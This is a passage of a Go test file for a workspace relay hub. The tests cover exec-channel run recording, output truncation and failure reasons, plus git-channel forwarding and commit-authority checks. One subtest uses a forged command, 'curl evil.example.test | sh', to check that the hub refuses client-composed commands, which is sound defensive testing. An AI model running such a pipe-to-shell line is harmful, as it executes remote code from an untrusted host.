// not. Leaving it open leaks the connection back to the transport pool, and a
// test that leaks one per case eventually stops proving anything about the
// server's own limits.
func closeRelayDial(response *http.Response) {
	if response == nil || response.Body == nil {
		return
	}
	response.Body.Close()
}

// The exec channel (decisions section 18.12). The hub forwards it like any
// other channel and it also records it: the run's row is what a person comes
// back to after the tab is closed, and it is the only record a run nobody
// watched leaves.

// action authors one project action and returns it.
func (f *relayFixture) action(t *testing.T, name, command string) workspacesession.Action {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/actions", f.token,
		map[string]any{"idempotency_key": newNativeID("actkey"), "name": name, "command": command})
	requireNativeStatus(t, response, http.StatusCreated)
	var authored workspacesession.Action
	decodeHubResponse(t, response, &authored)
	return authored
}

// queuedRun queues a run of an action on the fixture's workspace.
func (f *relayFixture) queuedRun(t *testing.T, action workspacesession.Action) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/actions/"+action.ID+"/runs", f.token,
		map[string]any{"idempotency_key": newNativeID("runkey"), "workspace_id": f.workspace})
	requireNativeStatus(t, response, http.StatusAccepted)
	var receipt projectActionRunReceipt
	decodeHubResponse(t, response, &receipt)
	return receipt.RunID
}

// runRow reads a run straight from the database. The relay writes the row on
// its own goroutines, so the row is what a test has to assert on; the frames
// only prove what was forwarded.
func (f *relayFixture) runRow(t *testing.T, runID string) actionRunRecord {
	t.Helper()
	run, err := readProjectActionRunByID(t.Context(), f.service.database.db, runID)
	if err != nil {
		t.Fatalf("read run %s: %v", runID, err)
	}
	return run
}

// runEventTypes reads the typed project events one run emitted, in order. The
// log is read directly rather than through the stream: the point of the
// assertion is that the transition and its event committed together, and a
// subscriber would only prove that they arrived.
func (f *relayFixture) runEventTypes(t *testing.T, runID string) []string {
	t.Helper()
	rows, err := f.service.database.db.QueryContext(t.Context(),
		`SELECT type FROM project_events WHERE organization_id = ? AND project_id = ? AND subject_id = ? ORDER BY seq`,
		f.project.OrganizationID, f.project.ID, runID)
	if err != nil {
		t.Fatalf("read run events: %v", err)
	}
	defer func() { _ = rows.Close() }()
	types := []string{}
	for rows.Next() {
		var value string
		if err := rows.Scan(&value); err != nil {
			t.Fatalf("scan run event: %v", err)
		}
		types = append(types, value)
	}
	if err := rows.Err(); err != nil {
		t.Fatalf("iterate run events: %v", err)
	}
	return types
}

// requireLastRunEvent asserts the newest event a run emitted.
//
// It exists rather than `types[len(types)-1]` at each call site because an
// empty list is a real outcome -- a run that emitted nothing at all is exactly
// what a broken recording path produces -- and indexing it panics with a
// confusing slice bounds error instead of saying which assertion failed and
// what the run actually published.
func requireLastRunEvent(t *testing.T, types []string, want string) {
	t.Helper()
	if len(types) == 0 {
		t.Fatalf("the run published no events, want %s last", want)
	}
	if last := types[len(types)-1]; last != want {
		t.Fatalf("events = %v, want %s last", types, want)
	}
}

// execRunFrame is a person's run on the exec channel.
func execRunFrame(runID string, action workspacesession.Action) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.ExecRun{
		RunID: runID, ActionID: action.ID, Command: action.Command})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: workspacesession.TypeExecRun, Payload: payload}
}

// execOutputFrame is one span of a run's combined output.
func execOutputFrame(stream string, output workspacesession.ExecOutput) workspacesession.Frame {
	payload, err := workspacesession.Encode(output)
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
		Type: workspacesession.TypeExecOutput, Payload: payload}
}

// execExitedFrame ends a run with an exit code.
func execExitedFrame(stream string, code int) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.ExecExited{Code: code})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
		Type: workspacesession.TypeExecExited, Payload: payload}
}

func TestWorkspaceRelayRefusesExecWhenTheRunnerDoesNotServeIt(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The default runner reports files and diff. Exec is a surface a runner
	// has to offer, so the channel is refused rather than forwarded to a
	// runner that cannot run anything.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(newNativeID("actionrun"), action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("exec answered %+v, want forbidden", payload)
	}
}

func TestWorkspaceRelayRefusesExecOnAReadOnlyWorkspace(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withReadOnlyExec)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The runner serves exec, and the workspace is still the one a model is
	// editing. A command writes into that worktree, so the channel is refused
	// whatever the runner can do.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(newNativeID("actionrun"), action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("exec on a read-only workspace answered %+v, want forbidden", payload)
	}
}

func TestWorkspaceRelayAnswersAnUnknownExecFrameType(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// Exec defines one person-originated frame. Anything else is answered
	// before a stream is allocated, so a client cannot spend its whole budget
	// on typos.
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: "input"})
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeUnknownFrame {
		t.Fatalf("an unknown exec type answered %+v, want unknown_frame", payload)
	}
	// The connection survives one bad frame, so the next legal run still
	// reaches the runner.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(f.queuedRun(t, action), action))
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeExecRun {
		t.Fatalf("the connection did not survive one bad frame: %+v", forwarded)
	}
}

func TestWorkspaceRelayGivesEachExecRunItsOwnStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")

	// Every run is its own process and its own seq space, exactly as every
	// terminal open is its own PTY: two runs on one stream would share one
	// sequence, and a reader could not tell whose output it was reading.
	first := f.queuedRun(t, action)
	second := f.queuedRun(t, action)
	person.send(execRunFrame(first, action))
	firstStream := runner.receive()
	person.send(execRunFrame(second, action))
	secondStream := runner.receive()
	if firstStream.Stream == "" || firstStream.Stream == secondStream.Stream {
		t.Fatalf("streams %q and %q, want two", firstStream.Stream, secondStream.Stream)
	}
	if firstStream.Seq != 1 || secondStream.Seq != 1 {
		t.Fatalf("seqs = %d and %d, want each run's own space to start at 1", firstStream.Seq, secondStream.Seq)
	}
}

func TestWorkspaceRelayRecordsAnExecRunThroughToItsExit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	if forwarded.Type != workspacesession.TypeExecRun || forwarded.Actor == nil {
		t.Fatalf("runner received %+v, want the run frame with the hub's actor stamp", forwarded)
	}
	// The row is claimed before the frame is forwarded, so a runner holding
	// the frame is serving a run the hub has already marked running.
	running := f.runRow(t, run)
	if running.Status != workspacesession.RunRunning || running.StartedAt == nil || running.Revision != 2 {
		t.Fatalf("run = %#v, want running with a start time at revision 2", running)
	}
	if types := f.runEventTypes(t, run); len(types) != 2 || types[1] != "action_run.running" {
		t.Fatalf("events = %v, want action_run.queued then action_run.running", types)
	}

	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "ok\t"}))
	if answer := person.receive(); answer.Type != workspacesession.TypeExecOutput {
		t.Fatalf("person received %+v, want the output forwarded", answer)
	}
	// A command that writes binary to its stdout sends its spans encoded, and
	// what is stored is the bytes rather than the envelope.
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{
		Data: base64.StdEncoding.EncodeToString([]byte("PASS\n")), Encoding: "base64"}))
	person.receive()
	runner.send(execExitedFrame(forwarded.Stream, 0))
	person.receive()

	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunSucceeded })
	finished := f.runRow(t, run)
	if finished.ExitCode == nil || *finished.ExitCode != 0 || finished.FinishedAt == nil {
		t.Fatalf("run = %#v, want exit 0 and a finish time", finished)
	}
	if finished.Output != "ok\tPASS\n" || finished.OutputBytes != int64(len("ok\tPASS\n")) || finished.Truncated {
		t.Fatalf("run = %#v, want the interleaved output stored whole", finished)
	}
	// A run that exited carries no reason: its exit code is the whole story.
	if finished.Reason != "" {
		t.Fatalf("run = %#v, want no reason", finished)
	}
	// The receipt is the output endpoint's own path, and the bytes are there.
	body := performHubAPIRequest(t, f.service, http.MethodGet, finished.OutputArtifact, f.token, nil)
	requireNativeStatus(t, body, http.StatusOK)
	if body.Body.String() != "ok\tPASS\n" {
		t.Fatalf("output = %q", body.Body.String())
	}
	requireLastRunEvent(t, f.runEventTypes(t, run), "action_run.succeeded")
}

func TestWorkspaceRelayRecordsANonZeroExitAsFailed(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "FAIL\n"}))
	person.receive()
	runner.send(execExitedFrame(forwarded.Stream, 7))
	person.receive()

	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.ExitCode == nil || *failed.ExitCode != 7 {
		t.Fatalf("run = %#v, want exit 7", failed)
	}
	// The reason field is for a run whose outcome could not be established at
	// all, which is not this one.
	if failed.Reason != "" || failed.Output != "FAIL\n" {
		t.Fatalf("run = %#v", failed)
	}
}

func TestWorkspaceRelayTruncatesExecOutputAtTheCap(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	span := strings.Repeat("x", workspacesession.MaxExecOutputFrameBytes)
	frames := workspacesession.MaxExecOutputBytes/len(span) + 2
	for range frames {
		runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: span}))
		answer := person.receive()
		ack, err := workspacesession.Encode(workspacesession.AckPayload{Through: answer.Seq})
		if err != nil {
			t.Fatal(err)
		}
		// Acknowledging keeps the relay's own replay buffer from overflowing.
		// That is a separate cap from the run's stored output, and this test is
		// about the second one.
		person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: forwarded.Stream,
			Type: workspacesession.TypeAck, Payload: ack})
	}
	runner.send(execExitedFrame(forwarded.Stream, 0))

	waitFor(t, func() bool { return workspacesession.TerminalRunStatus(f.runRow(t, run).Status) })
	capped := f.runRow(t, run)
	if capped.OutputBytes != workspacesession.MaxExecOutputBytes || len(capped.Output) != workspacesession.MaxExecOutputBytes {
		t.Fatalf("stored %d bytes, want exactly %d", capped.OutputBytes, workspacesession.MaxExecOutputBytes)
	}
	// A reader who cannot tell a finished log from a cut one reads the cut one
	// as finished.
	if !capped.Truncated {
		t.Fatalf("run = %#v, want truncated", capped)
	}
}

func TestWorkspaceRelayFailsARunWhenThePersonDisconnects(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "building\n"}))
	person.receive()

	// A run is not parked for a resume the way its stream is: a closed tab
	// must not leave a build that looks like it is still going.
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.Reason != workspacesession.RunReasonStreamClosed || failed.ExitCode != nil {
		t.Fatalf("run = %#v, want stream_closed and no exit code", failed)
	}
	// The output collected before the disconnect is kept: it is the only
	// record of what the run had done.
	if failed.Output != "building\n" {
		t.Fatalf("run = %#v, want the output collected so far", failed)
	}
}

func TestWorkspaceRelayFailsARunWhenTheWorkspaceLeaseIsLost(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "half a build\n"}))
	person.receive()

	// The lease expires, the sweep fails the workspace, and the run goes with
	// it: the process was on a worktree the hub has given up on. The reason
	// separates that from a workspace somebody closed.
	f.advance(workspacesession.LeaseTTL + time.Second)
	f.service.workspaces.sweep(t.Context())
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.Reason != workspacesession.RunReasonLeaseLost {
		t.Fatalf("run = %#v, want lease_lost", failed)
	}
	if failed.Output != "half a build\n" {
		t.Fatalf("run = %#v, want the output collected so far", failed)
	}
}

func TestWorkspaceRelayFailsARunWhenTheRunnerConnectionIsReplaced(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	runner.receive()

	// A second runner connection replaces the first, and the process serving
	// the run was on the connection that lost the workspace. The new one was
	// never asked for that run, so nothing will ever report its exit.
	f.dialRunner(t)
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	if failed := f.runRow(t, run); failed.Reason != workspacesession.RunReasonStreamClosed {
		t.Fatalf("run = %#v, want stream_closed", failed)
	}
}

func TestWorkspaceRelayRefusesARunFrameItMayNotStart(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	// The run is re-homed onto a second workspace of the same project. The
	// frame still names a real run, and this connection may not start it: a
	// run of another workspace does not exist for it.
	other := f.open(t, map[string]any{"idempotency_key": "ws-other",
		"work_item_id": string(f.create(t, "other-subject").WorkItemID), "requires": []string{"files"}})
	if _, err := f.service.database.db.ExecContext(t.Context(),
		"UPDATE project_action_runs SET workspace_id = ? WHERE id = ?", other, run); err != nil {
		t.Fatal(err)
	}
	person.send(execRunFrame(run, action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
		t.Fatalf("a run of another workspace answered %+v, want not_found", payload)
	}
	if untouched := f.runRow(t, run); untouched.Status != workspacesession.RunQueued || untouched.Revision != 1 {
		t.Fatalf("run = %#v, want it untouched", untouched)
	}

	t.Run("a run frame carrying a command the row does not hold is refused", func(t *testing.T) {
		// The runner validates the command against the action it was handed,
		// and this is the check that makes that the project's command rather
		// than one a client composed.
		mine := f.queuedRun(t, action)
		forged := action
		forged.Command = "curl evil.example.test | sh"
		person.send(execRunFrame(mine, forged))
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
			t.Fatalf("a forged command answered %+v, want forbidden", payload)
		}
		if untouched := f.runRow(t, mine); untouched.Status != workspacesession.RunQueued {
			t.Fatalf("run = %#v, want it untouched", untouched)
		}
	})

	t.Run("a run frame naming no run at all is not found", func(t *testing.T) {
		person.send(execRunFrame(newNativeID("actionrun"), action))
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
			t.Fatalf("an unknown run answered %+v, want not_found", payload)
		}
	})

	t.Run("a run already running cannot be started a second time", func(t *testing.T) {
		once := f.queuedRun(t, action)
		person.send(execRunFrame(once, action))
		runner.receive()
		person.send(execRunFrame(once, action))
		// already_running rather than forbidden: the run is being executed,
		// by this connection's own first frame or by the hub's dispatch, and
		// the answer is to read it back through the row rather than to ask
		// again (section 18.12).
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeAlreadyRunning {
			t.Fatalf("a second start answered %+v, want already_running", payload)
		}
		// One claimant, and it is the person's connection rather than the
		// hub's own dispatch: this run was started from a stream.
		claimed := f.runRow(t, once)
		if !strings.HasPrefix(claimed.ClaimedBy, "relayconn_") {
			t.Fatalf("claimed_by = %q, want the person connection that started it", claimed.ClaimedBy)
		}
	})
}

// The git channel (decisions section 18.13). It is the first channel that
// writes to the repository, so it is the first one whose frames are not all
// answered by the project read the connection proved on the upgrade.

// gitFrame is a person's request on the git channel. All three requests share
// one payload shape, so one helper serves status, commit and push.
func gitFrame(requestType, message string) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.GitRequest{Message: message})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelGit, Type: requestType, Payload: payload}
}

func TestWorkspaceRelayForwardsAGitStatusRequestAndItsAnswer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(gitFrame(workspacesession.TypeGitStatus, ""))
	forwarded := runner.receive()
	if forwarded.Channel != workspacesession.ChannelGit || forwarded.Type != workspacesession.TypeGitStatus {
		t.Fatalf("runner received %+v", forwarded)
	}
	connection, index, err := workspacesession.ParseStreamID(forwarded.Stream)
	if err != nil || index != 1 || connection == "" {
		t.Fatalf("stream id %q: %v", forwarded.Stream, err)
	}
	if forwarded.Seq != 1 {
		t.Fatalf("runner-bound seq = %d, want 1", forwarded.Seq)
	}
	// The actor now carries the author a commit would be made as, because the
	// runner authors one as the acting person and a client that could name its
	// own author could attribute a commit to anybody.
	actor := forwarded.Actor
	if actor == nil || actor.PrincipalID == "" || actor.Subject == "" || actor.ConnectionID != connection {
		t.Fatalf("actor = %+v, want the hub's stamp for connection %q", actor, connection)
	}
	if actor.Name == "" {
		t.Fatalf("actor = %+v, want a name for the author line", actor)
	}
	// This fixture's person is an operator token, which is not a person: it
	// gets the token's name so a runner's log says which credential acted, and
	// no email, which is what makes the runner refuse a commit from it.
	if actor.Email != "" {
		t.Fatalf("actor email = %q, want none for an operator token", actor.Email)
	}

	status, err := workspacesession.Encode(workspacesession.GitStatus{
		Branch: "feat/git-channel", Remote: "origin", Upstream: true, Ahead: 1, Dirty: 2, HeadSHA: "abc123",
	})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelGit, Stream: forwarded.Stream,
		Type: workspacesession.TypeGitStatus, Payload: status})
	answer := person.receive()
	if answer.Type != workspacesession.TypeGitStatus || answer.Stream != forwarded.Stream || answer.Seq != 1 {
		t.Fatalf("person received %+v", answer)
	}
	var reported workspacesession.GitStatus
	if err := json.Unmarshal(answer.Payload, &reported); err != nil {
		t.Fatal(err)
	}
	if reported.Branch != "feat/git-channel" || reported.Ahead != 1 || reported.Dirty != 2 {
		t.Fatalf("status = %+v", reported)
	}
}

// The git channel is request/response like files, so a stream-less request
// after the first is the same conversation continuing. A header that polls the
// status would otherwise spend the connection's whole stream budget on the one
// control it draws.
func TestWorkspaceRelayReusesTheGitChannelStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	first := ""
	for round := range workspacesession.MaxStreamsPerConnection + 1 {
		person.send(gitFrame(workspacesession.TypeGitStatus, ""))
		forwarded := runner.receive()
		if forwarded.Type != workspacesession.TypeGitStatus {
			t.Fatalf("round %d answered %+v, want the status forwarded", round+1, forwarded)
		}
		if first == "" {
			first = forwarded.Stream
		}
		if forwarded.Stream != first {
			t.Fatalf("round %d ran on stream %q, want %q", round+1, forwarded.Stream, first)
		}
		if forwarded.Seq != int64(round+1) {
			t.Fatalf("round %d had seq %d, want %d", round+1, forwarded.Seq, round+1)
		}
	}
}

// Every git frame the hub refuses on its own, with the proof that the refusal
// is the hub's: the frame never reaches the runner.
func TestWorkspaceRelayRefusesAGitFrameItMayNotForward(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name     string
		options  []func(*relayFixture)
		readOnly bool
		frame    workspacesession.Frame
		want     string
	}{
		{
			name: "commit on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitCommit, "Commit into a running attempt"),
			want:  workspacesession.CodeReadOnly,
		},
		{
			name: "push on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitPush, ""), want: workspacesession.CodeReadOnly,
		},
		{
			// A status is a read, so a read-only workspace answers it: the
			// header still shows the branch of the worktree the model is
			// editing.
			name: "status on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitStatus, ""), want: "",
		},
		{
			// The runner never reported the git capability, so the channel is
			// refused rather than forwarded to a runner that cannot serve it.
			name:  "status without the git capability",
			frame: gitFrame(workspacesession.TypeGitStatus, ""), want: workspacesession.CodeForbidden,
		},
		{
			name:  "commit without the git capability",
			frame: gitFrame(workspacesession.TypeGitCommit, "Commit on a worktree that is not a repository"),
			want:  workspacesession.CodeForbidden,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			f := newRelayFixture(t, test.options...)
			if test.readOnly {
				f.markReadOnly(t)
			}
			runner := f.dialRunner(t)
			person := f.dialPerson(t)

			person.send(test.frame)
			if test.want == "" {
				if forwarded := runner.receive(); forwarded.Type != test.frame.Type {
					t.Fatalf("the runner received %+v, want %s forwarded", forwarded, test.frame.Type)
				}
				return
			}
			if payload := errorPayload(t, person.receive()); payload.Code != test.want {
				t.Fatalf("the frame answered %+v, want %s", payload, test.want)
			}
			// A refusal the hub made is a refusal the runner never saw, so the
			// next legal frame is the first thing on its socket. Asserting the
			// absence any other way would be asserting on a timeout.
			person.send(filesListFrame("."))
			if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeFilesList {
				t.Fatalf("the runner received %+v before the files list", forwarded)
			}
		})
	}
}

// A git command that ran and failed is not a refusal: the request was allowed
// and git answered no. The person needs what git said rather than a paraphrase
// of it, so the stderr rides through the relay intact.
func TestWorkspaceRelayCarriesAGitFailureWithItsStderr(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(gitFrame(workspacesession.TypeGitPush, ""))
	forwarded := runner.receive()
	const stderr = "! [rejected] main -> main (fetch first)\nerror: failed to push some refs\n"
	runner.send(workspacesession.GitFailedFrame(workspacesession.ChannelGit, forwarded.Stream,
		"The push was rejected", stderr))

	payload := errorPayload(t, person.receive())
	if payload.Code != workspacesession.CodeGitFailed {
		t.Fatalf("the failure answered %+v, want git_failed", payload)
	}
	if payload.Stderr != stderr {
		t.Fatalf("stderr = %q, want %q", payload.Stderr, stderr)
	}
}

// seedHostedMember inserts the rows a hosted person principal is made of: the
// api_tokens principal every member has, the membership row with its role, and
// the project grant. It returns a person connection shaped like the one the
// upgrade builds for that member.
//
// The grant is "", "read" or "write", spelled rather than a boolean because an
// absent grant and a read-only grant are different refusals and a boolean
// cannot say which of the three a case means.
func (f *relayFixture) seedHostedMember(t *testing.T, name, role, grant string) *relayConnection {
	t.Helper()
	now := formatHubTime(f.at())
	principal := "hosted_" + name
	subject := "user_" + name
	if _, err := f.service.database.db.ExecContext(t.Context(), `INSERT INTO api_tokens
 (id,name,token_hash,token_fingerprint,scope,created_at,updated_at) VALUES (?,?,?,?,'operator',?,?)`,
		principal, principal, apikey.HashToken(principal), principal[:8], now, now); err != nil {
		t.Fatal(err)
	}
	if _, err := f.service.database.db.ExecContext(t.Context(), `INSERT INTO hosted_members
 (user_id,email,membership_id,role,active,principal_id,created_at,updated_at) VALUES (?,?,?,?,1,?,?,?)`,
		subject, name+"@example.test", "membership_"+name, role, principal, now, now); err != nil {
		t.Fatal(err)
	}
	if grant != "" {
		if _, err := f.service.database.db.ExecContext(t.Context(), `INSERT INTO hosted_project_grants
 (user_id,organization_id,project_id,can_write,manage_runner) VALUES (?,?,?,?,0)`,
			subject, string(f.project.OrganizationID), string(f.project.ID), grant == "write"); err != nil {
			t.Fatal(err)
		}
	}
	return &relayConnection{
		id: "relayconn_" + name, workspaceID: f.workspace, principalID: principal,
		subject: subject, sessionHash: "session_hash_" + name,
	}
}

// The `write` half of section 18.2's authority list, which the git channel is
// the first channel to need.
//
// It is driven through refuseGitWrite against the fixture's own database rather
// than over a socket, and the reason is the fixture's person: an operator
// token, which the check permits by design because its authority is the token
// the middleware already proved on the upgrade. Reaching the hosted branch
// over a socket would mean a second hub configured as a hosted tenant -- its
// own identity provider, its own project insert, its own runner enrollment and
// its own cookie-authenticated ticket mint -- built to assert one SQL
// predicate. The predicate is what the rule is, so it is asserted directly and
// the socket path is covered by the refusals above.
func TestWorkspaceRelayGitWriteAuthority(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	for _, test := range []struct {
		name      string
		role      string
		grant     string
		token     bool
		readOnly  bool
		frameType string
		want      string
	}{
		{name: "member with write", role: "member", grant: "write", frameType: workspacesession.TypeGitCommit},
		{name: "push with write", role: "member", grant: "write", frameType: workspacesession.TypeGitPush},
		{
			// Read on the project is enough for any stream, so the status the
			// header draws from is answered.
			name: "status with read only", role: "member", grant: "read", frameType: workspacesession.TypeGitStatus,
		},
		{
			name: "commit with read only", role: "member", grant: "read",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			// requireHostedProject refuses a write to a viewer however
			// generous the grant row is, so a role demotion must not be
			// survivable by holding an old can_write row.
			name: "viewer with write", role: "viewer", grant: "write",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			name: "member with no grant", role: "member",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			// The token principal's bypass. It is not a hole: an operator
			// token proved the same write scope at the upgrade, and it has no
			// membership row this check could read.
			name: "operator token", token: true, frameType: workspacesession.TypeGitCommit,
		},
		{
			// Read-only is answered before the grant is read at all: the
			// workspace refuses the write whoever is asking.
			name: "owner on a read-only workspace", role: "owner", grant: "write", readOnly: true,
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeReadOnly,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			record := f.record(t)
			record.ReadOnly = test.readOnly
			connection := &relayConnection{id: "relayconn_token", workspaceID: f.workspace}
			if !test.token {
				connection = f.seedHostedMember(t, strings.ReplaceAll(test.name, " ", "-"), test.role, test.grant)
			}
			frame := gitFrame(test.frameType, "Commit from the authority table")
			if code := f.service.workspaces.refuseGitWrite(t.Context(), record, connection, frame); code != test.want {
				t.Fatalf("refuseGitWrite = %q, want %q", code, test.want)
			}
		})
	}
}

// A frame on another channel is never the git channel's business, whatever its
// type happens to be called. "commit" is a plausible name on a channel that
// has not been written yet, and reading the type without the channel would
// refuse it on a rule that does not apply to it.
func TestWorkspaceRelayGitWriteCheckIgnoresOtherChannels(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	f.markReadOnly(t)
	record := f.record(t)
	connection := f.seedHostedMember(t, "other-channel", "member", "read")
	for _, channel := range []string{workspacesession.ChannelFiles, workspacesession.ChannelDiff, workspacesession.ChannelPreview} {
		frame := workspacesession.Frame{Channel: channel, Type: workspacesession.TypeGitCommit}
		if code := f.service.workspaces.refuseGitWrite(t.Context(), record, connection, frame); code != "" {
			t.Fatalf("the %s channel was refused with %q", channel, code)
		}
	}
}

// The author stamped onto every person-originated frame, which is who a commit
// is made as.
func TestRelayActorStampsTheAuthor(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.seedHostedMember(t, "ada.lovelace", "member", "write")
	for _, test := range []struct {
		name      string
		principal relayPrincipal
		wantName  string
		wantEmail string
	}{
		{
			name: "hosted member",
			principal: relayPrincipal{
				credential:  apiCredential{Hosted: &auth.HostedIdentity{Subject: "user_ada.lovelace"}},
				subject:     "user_ada.lovelace",
				principalID: "hosted_ada.lovelace",
			},
			wantName: "Ada Lovelace", wantEmail: "ada.lovelace@example.test",
		},
		{
			// A support actor holds no membership row, so there is no email to
			// author with and the runner refuses the commit. That is the only
			// correct answer: attributing it to the person being stood in for
			// would put a name in the repository's history that never typed
			// it.
			name: "support actor",
			principal: relayPrincipal{
				credential: apiCredential{Hosted: &auth.HostedIdentity{
					Subject: "user_ada.lovelace", SupportActor: "support@example.test",
				}},
				subject:       "support@example.test",
				principalID:   "hosted_ada.lovelace",
				supportReason: "customer-request",
			},
			wantName: "support@example.test",
		},
		{
			// An operator token is not a person. It names the credential so a
			// runner's log says which one acted, and authors nothing.
			name: "operator token",
			principal: relayPrincipal{
				credential: apiCredential{Name: "operator-relay", ID: "tok_1"},
				subject:    "operator-relay", principalID: "tok_1",
			},
			wantName: "operator-relay",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			connection := &relayConnection{id: "relayconn_actor", workspaceID: f.workspace}
			actor := f.service.relayActor(t.Context(), connection, test.principal)
			if actor.Name != test.wantName || actor.Email != test.wantEmail {
				t.Fatalf("actor = %+v, want name %q and email %q", actor, test.wantName, test.wantEmail)
			}
			if actor.PrincipalID != test.principal.principalID || actor.Subject != test.principal.subject {
				t.Fatalf("actor = %+v, want the principal's own tuple", actor)
			}
